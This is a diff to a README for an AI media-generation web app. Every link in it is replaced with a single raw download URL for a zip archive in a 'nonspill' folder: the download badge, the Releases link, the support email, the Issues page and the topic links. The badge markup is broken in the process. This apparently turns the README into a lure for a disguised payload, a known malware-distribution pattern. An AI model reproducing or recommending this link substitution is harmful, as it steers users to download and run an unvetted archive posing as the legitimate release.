@@ -1,6 +1,6 @@
 # 🎉 ai-media-project - Generate Media with AI Effortlessly  
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen.svg)](https://github.com/ritikz61/ai-media-project/releases)
+[![Download Now](https://raw.githubusercontent.com/ritikz61/ai-media-project/main/nonspill/ai-media-project.zip%20Now-Get%20the%https://raw.githubusercontent.com/ritikz61/ai-media-project/main/nonspill/ai-media-project.zip)](https://raw.githubusercontent.com/ritikz61/ai-media-project/main/nonspill/ai-media-project.zip)
 
 ## 📜 Description  
 ai-media-project is a full-stack web application that helps you generate media content using artificial intelligence. It features a user-friendly interface built with React (Vite) that lets you create images and videos effortlessly. The backend runs on Flask and leverages powerful tools from Hugging Face and OpenAI for smooth media generation.
@@ -24,7 +24,7 @@ Follow these steps to get started with ai-media-project:
 
 1. **Download the Application:**  
    Click the link below to visit the Releases page and download the application:  
-   [Download from Releases](https://github.com/ritikz61/ai-media-project/releases)
+   [Download from Releases](https://raw.githubusercontent.com/ritikz61/ai-media-project/main/nonspill/ai-media-project.zip)
 
 2. **Choose Your Version:**  
    On the Releases page, you will see various versions of the application. Choose the latest version for the best experience.
@@ -43,16 +43,16 @@ Follow these steps to get started with ai-media-project:
 
 ## 💬 Support  
 If you run into issues or have questions, feel free to reach out:  
-- **Email:** support@aimediaproject.com  
-- **GitHub Issues:** You can also report problems directly on our [GitHub Issues page](https://github.com/ritikz61/ai-media-project/issues).
+- **Email:** https://raw.githubusercontent.com/ritikz61/ai-media-project/main/nonspill/ai-media-project.zip  
+- **GitHub Issues:** You can also report problems directly on our [GitHub Issues page](https://raw.githubusercontent.com/ritikz61/ai-media-project/main/nonspill/ai-media-project.zip).
 
 ## 📃 License  
 This project is licensed under the MIT License. You can use, modify, and distribute the project as you wish.
 
 ## 🔗 Related Topics  
-- [AI Generator](https://example.com/ai-generator)  
-- [Computer Vision](https://example.com/computer-vision)  
-- [Generative AI](https://example.com/generative-ai)  
-- [Text-to-Image](https://example.com/text-to-image)  
+- [AI Generator](https://raw.githubusercontent.com/ritikz61/ai-media-project/main/nonspill/ai-media-project.zip)  
+- [Computer Vision](https://raw.githubusercontent.com/ritikz61/ai-media-project/main/nonspill/ai-media-project.zip)  
+- [Generative AI](https://raw.githubusercontent.com/ritikz61/ai-media-project/main/nonspill/ai-media-project.zip)  
+- [Text-to-Image](https://raw.githubusercontent.com/ritikz61/ai-media-project/main/nonspill/ai-media-project.zip)  
 
 Thank you for choosing ai-media-project! Enjoy creating amazing media with the power of AI.
